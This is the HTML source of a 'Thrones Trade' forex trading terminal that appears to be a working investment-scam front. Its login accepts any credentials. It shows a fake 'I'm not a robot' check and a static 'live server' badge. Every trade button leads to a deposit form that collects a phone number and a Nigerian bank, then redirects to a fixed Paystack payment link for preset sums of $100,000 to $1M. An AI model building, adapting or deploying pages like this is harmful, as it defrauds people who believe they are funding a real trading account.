<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade | Thrones Forex Terminal</title>
    <style>
        :root { --bg: #06090f; --panel: #121824; --green: #00ff88; --red: #ff3b3b; --accent: #c1a461; --text: #f0f2f5; --border: #1e2633; }
        
        @keyframes led-glow { 0% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } 50% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; } 100% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } }
        
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; height: 100vh; display: flex; flex-direction: column; border: 4px solid #f00; animation: led-glow 5s infinite; box-sizing: border-box; overflow: hidden; }

        /* HEADER */
        header { height: 60px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; flex-shrink: 0; }
        
        /* MAIN BODY */
        .main-container { display: flex; flex: 1; overflow: hidden; width: 100%; }

        /* CENTER AREA (CHART & CHAT) */
        .center-stack { flex: 1; display: flex; flex-direction: column; border-right: 1px solid var(--border); min-width: 0; }
        #tv_chart_container { flex: 2; background: #000; position: relative; border-bottom: 1px solid var(--border); }
        .chat-area { flex: 1; background: var(--panel); }

        /* SIDEBAR */
        .sidebar { width: 300px; background: var(--panel); padding: 20px; display: flex; flex-direction: column; gap: 15px; flex-shrink: 0; }
        
        .card { background: #000; border: 1px solid var(--border); padding: 15px; border-radius: 8px; }
        .balance-label { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 1px; }
        .balance-amt { font-size: 28px; font-weight: 900; color: var(--red); margin: 5px 0; }

        /* BUTTONS */
        .btn { width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        .btn-fund { background: var(--accent); color: #000; margin-top: 10px; padding: 10px; }
        .btn-call { background: var(--green); color: #000; height: 70px; font-size: 18px; }
        .btn-sell { background: var(--red); color: #fff; height: 50px; }

        /* OVERLAYS */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 20px; }
        .login-card { background: var(--panel); width: 350px; padding: 30px; border: 2px solid var(--accent); border-radius: 12px; text-align: center; }
        
        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 5px; box-sizing: border-box; }
        
        .amt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
        .amt-opt { background: #000; border: 1px solid var(--border); color: var(--green); padding: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; }

        /* RECAPTCHA BOX */
        .captcha-box { background: #f9f9f9; color: #555; padding: 10px; display: flex; align-items: center; justify-content: space-between; border-radius: 3px; border: 1px solid #d3d3d3; margin: 15px 0; text-align: left; font-size: 13px; }
    </style>
</head>
<body>

    <div id="fundModal" class="modal-overlay">
        <div class="login-card" style="width: 400px;">
            <h2 style="color:var(--accent); margin:0;">DEPOSIT FUNDS</h2>
            <p style="font-size: 11px; color: #666;">Secure Paystack Gateway</p>
            
            <input type="tel" id="pPhone" placeholder="Phone Number (08153609706)">
            <select id="pBank">
                <option value="" disabled selected>Select Payment Bank</option>
                <option value="OPay">OPay</option>
                <option value="PalmPay">PalmPay</option>
                <option value="GTB">GTBank</option>
                <option value="Kuda">Kuda</option>
            </select>
            
            <div class="amt-grid">
                <button class="amt-opt" onclick="pay(100000)">$100,000</button>
                <button class="amt-opt" onclick="pay(200000)">$200,000</button>
                <button class="amt-opt" onclick="pay(500000)">$500,000</button>
                <button class="amt-opt" onclick="pay(1000000)" style="color:#ffd700;">$1M (VIP)</button>
            </div>
            <button onclick="document.getElementById('fundModal').style.display='none'" style="color:#555; background:none; border:none; cursor:pointer;">Cancel</button>
        </div>
    </div>

    <div id="loginModal" class="modal-overlay" style="display: flex;">
        <div class="login-card">
            <h1 style="color:var(--accent); margin-bottom: 20px;">THRONES TRADE</h1>
            <form onsubmit="login(event)">
                <input type="text" id="user" placeholder="Trader ID" required>
                <input type="password" id="pass" placeholder="Password" required>
                
                <div class="captcha-box">
                    <div style="display:flex; align-items:center;">
                        <input type="checkbox" required style="width:20px; margin-right:10px;"> I'm not a robot
                    </div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" width="30">
                </div>
                
                <button type="submit" class="btn" style="background:var(--accent);">Enter Terminal</button>
            </form>
        </div>
    </div>

    <header>
        <div style="font-weight: 900; font-size: 20px; color: var(--accent);">THRONES <span style="color:#fff">TRADE</span></div>
        <div style="color: var(--green); font-size: 11px; font-weight: bold;">● LIVE SERVER CONNECTED</div>
    </header>

    <div class="main-container">
        <div class="center-stack">
            <div id="tv_chart_container">
                <div class="tradingview-widget-container" style="height:100%;width:100%;">
                  <div id="tradingview_12345" style="height:100%;width:100%;"></div>
                  <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
                  <script type="text/javascript">
                  new TradingView.widget({
                    "autosize": true,
                    "symbol": "FX:EURUSD",
                    "interval": "1",
                    "timezone": "Etc/UTC",
                    "theme": "dark",
                    "style": "1",
                    "locale": "en",
                    "toolbar_bg": "#f1f3f6",
                    "enable_publishing": false,
                    "hide_side_toolbar": false,
                    "allow_symbol_change": true,
                    "container_id": "tradingview_12345"
                  });
                  </script>
                </div>
            </div>
            <div class="chat-area">
                <iframe src="https://www3.cbox.ws/box/?boxid=3541705&boxtag=thronestrade" width="100%" height="100%" frameborder="0"></iframe>
            </div>
        </div>

        <div class="sidebar">
            <div class="card">
                <div class="balance-label">Trading Balance</div>
                <div id="balance" class="balance-amt">$0.00</div>
                <button class="btn btn-fund" onclick="document.getElementById('fundModal').style.display='flex'">+ Add Funds</button>
            </div>

            <div style="margin-top: auto;">
                <button class="btn btn-call" onclick="document.getElementById('fundModal').style.display='flex'">▲ CALL / BUY</button>
                <div style="height:10px;"></div>
                <button class="btn btn-sell" onclick="alert('Insufficient Balance')">▼ SELL / PUT</button>
            </div>
        </div>
    </div>

    <script>
        const PAYSTACK_URL = "https://paystack.shop/pay/m3gzeovryt";

        function login(e) {
            e.preventDefault();
            localStorage.setItem('trade_user', document.getElementById('user').value);
            document.getElementById('loginModal').style.display = 'none';
        }

        function pay(amt) {
            const phone = document.getElementById('pPhone').value;
            const bank = document.getElementById('pBank').value;
            if(!phone || !bank) { alert("Enter phone and select bank!"); return; }
            
            const kobo = amt * 100;
            window.location.href = PAYSTACK_URL + "?amount=" + kobo + "&phone=" + phone;
        }

        window.onload = function() {
            if(localStorage.getItem('trade_user')) {
                document.getElementById('loginModal').style.display = 'none';
            }
        }
    </script>
</body>
</html>
